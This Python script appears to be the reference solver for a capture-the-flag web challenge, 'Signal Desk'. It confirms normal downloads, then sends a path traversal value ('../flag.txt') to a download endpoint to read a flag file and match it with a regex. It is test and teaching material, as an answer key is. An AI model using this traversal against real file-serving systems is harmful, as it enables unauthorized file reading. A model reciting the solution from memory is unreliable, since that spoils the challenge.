#!/usr/bin/env python3
"""
Reference solver for Signal Desk.

Intended solve path: discover the file portal, confirm normal downloads, then
use path traversal to read the flag outside the document directory.
"""
import re
import sys

import requests

FLAG_RE = re.compile(r"destrier\{(?=[a-z0-9_]*[0-9])[a-z0-9_]+\}")


def solve(base_url: str):
    base_url = base_url.rstrip("/")

    # 1. Discover the VM web service
    requests.get(f"{base_url}/", timeout=5)

    # 2. Confirm that ordinary document downloads work
    normal = requests.get(
        f"{base_url}/download",
        params={"file": "welcome.txt"},
        timeout=10,
    )
    assert "Signal Desk" in normal.text, "normal download not reachable"

    # 3. Escape the document directory and read the flag
    flag_response = requests.get(
        f"{base_url}/download",
        params={"file": "../flag.txt"},
        timeout=10,
    )
    match = FLAG_RE.search(flag_response.text)
    return match.group(0) if match else None


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("usage: solve.py <base_url>", file=sys.stderr)
        sys.exit(2)
    flag = solve(sys.argv[1])
    if not flag:
        print("FAILED: no flag recovered", file=sys.stderr)
        sys.exit(1)
    print(flag)
